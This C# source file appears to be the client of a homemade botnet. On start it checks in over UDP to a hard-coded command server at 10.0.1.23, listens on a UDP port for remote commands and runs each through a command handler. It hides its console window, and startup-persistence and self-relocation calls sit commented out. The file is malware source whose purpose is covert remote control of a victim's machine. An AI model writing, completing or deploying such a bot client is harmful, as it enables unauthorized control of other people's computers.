using BotNet;
using BotNet.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    class Program
    {
        private static Socket s;
        private static CommandHandler ch;
        private static StartupHandler sh;

        static void Main(string[] args)
        {
            sendCmd("connection");

            ch = new CommandHandler();
            sh = new StartupHandler();

            s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            s.Bind(new IPEndPoint(IPAddress.IPv6Any, 14568));

            Task t = Task.Factory.StartNew(Listen);

            /*
            if (!(sh.fileExists()))
            {
                //sh.addToStartup();
                sh.moveRunningLocation();
            }
            */

            sh.hideWindow();
            Console.ReadKey();
        }

        public static void sendCmd(string cmd)
        {
            Socket s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("10.0.1.23"), 14567);
            Byte[] data = Encoding.ASCII.GetBytes(cmd);
            s.SendTo(data, ipep);
        }

        public static void Listen()
        {
            IPEndPoint ipep = new IPEndPoint(IPAddress.IPv6Any, 69);
            EndPoint ep = ipep as EndPoint;
            Byte[] data = new Byte[65535];
            s.ReceiveFrom(data, ref ep);
            List<Byte> bytes = new List<Byte>(data);
            bytes.RemoveAll(b => b == 0);
            Console.WriteLine(ch.runCommand(Encoding.ASCII.GetString(bytes.ToArray())));
            Listen();
        }
    }
}
